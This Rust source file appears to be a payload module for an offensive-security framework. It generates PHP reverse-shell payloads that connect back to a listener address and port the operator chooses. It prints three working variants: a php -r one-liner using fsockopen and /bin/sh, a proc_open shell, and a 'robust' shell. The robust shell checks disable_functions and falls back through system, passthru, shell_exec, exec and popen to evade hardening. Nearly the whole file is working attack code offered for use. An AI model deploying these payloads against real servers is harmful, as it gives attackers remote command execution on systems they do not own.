//! PHP Reverse TCP Shell Payload Generator
//!
//! Creates a PHP reverse shell with checks for disabled functions.

use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;

static NAME: &str = "PHP Reverse TCP";
static DESCRIPTION: &str = "PHP reverse shell with disabled function checks";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Multi];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86];

static LHOST_NAME: &str = "LHOST";
static LHOST_DESC: &str = "Listener address";
static LHOST_DEFAULT: &str = "127.0.0.1";
static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Listener port";
static LPORT_DEFAULT: &str = "4444";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: LHOST_NAME.as_ptr() as *const c_char, len: LHOST_NAME.len() },
        description: CString { ptr: LHOST_DESC.as_ptr() as *const c_char, len: LHOST_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: LHOST_DEFAULT.as_ptr() as *const c_char, len: LHOST_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: LPORT_NAME.as_ptr() as *const c_char, len: LPORT_NAME.len() },
        description: CString { ptr: LPORT_DESC.as_ptr() as *const c_char, len: LPORT_DESC.len() },
        required: true,
        option_type: OptionType::Port,
        default_value: CString { ptr: LPORT_DEFAULT.as_ptr() as *const c_char, len: LPORT_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Payload,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
struct ModuleInstance { _dummy: u8 }

#[derive(Deserialize, Debug)]
struct PayloadOptions {
    #[serde(rename = "LHOST")]
    lhost: Option<String>,
    #[serde(rename = "LPORT")]
    lport: Option<String>,
}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) { if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut ModuleInstance); } } }

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    let options: PayloadOptions = match parse_options(config) {
        Ok(opts) => opts,
        Err(e) => { eprintln!("[-] Parse error: {}", e); return 1; }
    };

    let lhost = match options.lhost {
        Some(h) => h,
        None => { eprintln!("[-] LHOST required"); return 1; }
    };

    let lport = match options.lport {
        Some(p) => p,
        None => { eprintln!("[-] LPORT required"); return 1; }
    };

    // Simple one-liner
    let payload_simple = format!(
        r#"php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'"#,
        lhost, lport
    );

    // Full PHP shell with multiple exec function fallbacks
    let payload_full = format!(r#"<?php
$ip = '{}';
$port = {};

$sock = fsockopen($ip, $port);
if (!$sock) {{ die("Connection failed"); }}

$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);

$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
?>
"#, lhost, lport);

    // Robust version with disabled function checks
    let payload_robust = format!(r#"<?php
$ip='{}';
$port={};
$dis=@ini_get('disable_functions');
if(!empty($dis)){{$dis=preg_replace('/[, ]+/',',',$dis);$dis=explode(',',$dis);$dis=array_map('trim',$dis);}}else{{$dis=array();}}
function runcmd($c){{global $dis;$o='';
if(is_callable('system')&&!in_array('system',$dis)){{ob_start();system($c);$o=ob_get_contents();ob_end_clean();}}
elseif(is_callable('passthru')&&!in_array('passthru',$dis)){{ob_start();passthru($c);$o=ob_get_contents();ob_end_clean();}}
elseif(is_callable('shell_exec')&&!in_array('shell_exec',$dis)){{$o=shell_exec($c);}}
elseif(is_callable('exec')&&!in_array('exec',$dis)){{$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}}
elseif(is_callable('popen')&&!in_array('popen',$dis)){{$fp=popen($c,'r');$o='';while(!feof($fp)){{$o.=fread($fp,1024);}}pclose($fp);}}
return $o;}}
$s=@fsockopen("tcp://$ip",$port);
while($c=fread($s,2048)){{$out='';
if(substr($c,0,3)=='cd '){{chdir(substr($c,3,-1));}}
elseif(substr($c,0,4)=='quit'||substr($c,0,4)=='exit'){{break;}}
else{{$out=runcmd(substr($c,0,-1));}}
fwrite($s,$out);}}
fclose($s);
?>
"#, lhost, lport);

    println!("\n[+] PHP Reverse Shell Payload:");
    println!("    Target: {}:{}\n", lhost, lport);

    println!("=== Option 1: One-liner (CLI) ===");
    println!("{}", payload_simple);

    println!("\n=== Option 2: Simple (save as .php) ===");
    println!("{}", payload_full);

    println!("\n=== Option 3: Robust with disabled function checks ===");
    println!("{}", payload_robust);

    println!("\n[*] Ensure handler is listening: use utilities/multi_handler");

    0
}

fn parse_options(config: *const c_char) -> Result<PayloadOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PayloadOptions { lhost: None, lport: None });
    }
    Ok(serde_json::from_str(unsafe { CStr::from_ptr(config).to_str()? })?)
}

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
